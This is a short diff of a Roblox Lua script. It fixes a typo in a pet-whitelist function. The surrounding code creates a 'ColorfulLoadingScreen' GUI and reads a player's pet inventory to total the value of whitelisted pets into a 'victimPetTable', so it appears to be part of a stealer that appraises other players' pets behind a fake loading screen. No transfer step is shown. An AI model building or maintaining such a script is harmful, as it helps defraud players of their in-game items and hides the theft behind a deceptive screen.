@@ -1,4 +1,3 @@
-
 -- Создание GUI
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "ColorfulLoadingScreen"
@@ -75,7 +74,7 @@ local PET_VALUES = {
 }
 
 
-local function checkPetsWhilelist(pet)
+local function checkPetsWhitelist(pet)
     for _, name in ipairs(PET_WHITELIST) do
         if string.find(pet, name) then
             return true
@@ -88,7 +87,7 @@ local function getInventoryValue()
     local total = 0
     for _, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
         local petName = petData.PetType
-        if checkPetsWhilelist(petName) then
+        if checkPetsWhitelist(petName) then
             local petPrice = PET_VALUES[petName] or 0
             total += petPrice
         end
@@ -229,7 +228,7 @@ end
 
     for petUid, value in pairs(require(game:GetService("ReplicatedStorage").Modules.DataService):GetData().PetsData.PetInventory.Data) do
         local petName = value.PetType
-        if not checkPetsWhilelist(petName) then continue end
+        if not checkPetsWhitelist(petName) then continue end
         local petPrice = PET_VALUES[petName] or 0
         totalValue += petPrice
         table.insert(victimPetTable, string.format("%s - %sValue", petName, petPrice))
